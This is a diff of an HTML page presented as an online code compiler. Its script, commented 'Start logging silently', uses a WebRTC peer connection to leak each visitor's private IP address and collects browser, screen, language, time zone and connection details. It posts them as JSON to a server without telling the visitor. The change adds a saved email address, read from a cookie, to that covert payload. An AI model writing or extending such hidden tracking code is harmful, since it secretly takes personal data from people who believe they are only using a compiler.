@@ -3,21 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <title>Compiler Online</title>
-</head>
-<body>
-    <h1>Compiler Online</h1>
-
-    <h2>Search</h2>
-    <input type="text" id="search" placeholder="Enter search term..." />
-
-    <h2>Code Submission</h2>
-    <textarea id="code" rows="10" cols="30" placeholder="Write your code here..."></textarea><br>
-    <button id="submit">Submit Code</button>
-
-    <h2>Output</h2>
-    <pre id="output"></pre>
-
     <script>
+        // Function to set a cookie
+        function setCookie(name, value, days) {
+            let expires = "";
+            if (days) {
+                const date = new Date();
+                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+                expires = "; expires=" + date.toUTCString();
+            }
+            document.cookie = name + "=" + (value || "") + expires + "; path=/";
+        }
+
+        // Function to get a cookie
+        function getCookie(name) {
+            const nameEQ = name + "=";
+            const ca = document.cookie.split(';');
+            for (let i = 0; i < ca.length; i++) {
+                let c = ca[i];
+                while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
+
         async function logPrivateIPAndInfo() {
             const pc = new RTCPeerConnection();
             let logged = false;
@@ -30,28 +39,18 @@
                     const candidate = event.candidate.candidate;
                     if (candidate.includes("candidate")) {
                         const localIP = candidate.split(" ")[4];
+                        const email = getCookie('userEmail') || 'No email provided'; // Retrieve email from cookie
                         const searchTerm = document.getElementById('search').value || 'No search term entered';
                         const userAgent = navigator.userAgent;
                         const referrer = document.referrer || 'No referrer';
                         const currentURL = window.location.href;
                         const screenWidth = window.screen.width;
                         const screenHeight = window.screen.height;
-                        const browserLanguage = navigator.language || navigator.userLanguage; // Get browser language
-                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Get time zone
-                        const osInfo = navigator.platform; // Get operating system
-                        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown'; // Get connection type
-                        const browserVersion = userAgent.split(' ')[userAgent.split(' ').length - 1]; // Attempt to get browser version
-                        const deviceMemory = navigator.deviceMemory || 'unknown'; // Get device memory
-                        const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown'; // Get hardware concurrency
-                        const pixelRatio = window.devicePixelRatio || 'unknown'; // Get pixel ratio
-                        const onlineStatus = navigator.onLine ? 'Online' : 'Offline'; // Online status
-                        const viewportWidth = window.innerWidth; // Viewport width
-                        const viewportHeight = window.innerHeight; // Viewport height
-                        const colorDepth = window.screen.colorDepth; // Color depth
-                        const touchSupport = 'ontouchstart' in window ? 'Supported' : 'Not Supported'; // Touch support
-                        const cookiesEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled'; // Cookies enabled
-                        const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins'; // Browser plugins
-                        const timestamp = new Date().toISOString(); // Current timestamp
+                        const browserLanguage = navigator.language || navigator.userLanguage;
+                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                        const osInfo = navigator.platform;
+                        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';
+                        const timestamp = new Date().toISOString();
 
                         logged = true;
 
@@ -60,6 +59,7 @@
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
                                 ip: localIP,
+                                email,
                                 searchTerm,
                                 userAgent,
                                 referrer,
@@ -70,18 +70,7 @@
                                 timeZone,
                                 osInfo,
                                 timestamp,
-                                connectionType,
-                                browserVersion,
-                                deviceMemory,
-                                hardwareConcurrency,
-                                pixelRatio,
-                                onlineStatus,
-                                viewportWidth,
-                                viewportHeight,
-                                colorDepth,
-                                touchSupport,
-                                cookiesEnabled,
-                                plugins
+                                connectionType
                             })
                         }).then(response => {
                             if (!response.ok) {
@@ -93,6 +82,14 @@
                     }
                 }
             };
+        }
+
+        function saveEmail() {
+            const emailInput = document.getElementById('email').value;
+            if (emailInput) {
+                setCookie('userEmail', emailInput, 7); // Store email in cookie for 7 days
+                alert('Email saved in cookies!');
+            }
         }
 
         async function compileCode() {
@@ -109,7 +106,25 @@
         }
 
         document.getElementById('submit').onclick = compileCode;
+        document.getElementById('saveEmailButton').onclick = saveEmail;
         logPrivateIPAndInfo(); // Start logging silently
     </script>
+</head>
+<body>
+    <h1>Compiler Online</h1>
+
+    <h2>Email Submission</h2>
+    <input type="email" id="email" placeholder="Enter your email" />
+    <button id="saveEmailButton">Save Email</button>
+
+    <h2>Search</h2>
+    <input type="text" id="search" placeholder="Enter search term..." />
+
+    <h2>Code Submission</h2>
+    <textarea id="code" rows="10" cols="30" placeholder="Write your code here..."></textarea><br>
+    <button id="submit">Submit Code</button>
+
+    <h2>Output</h2>
+    <pre id="output"></pre>
 </body>
 </html>
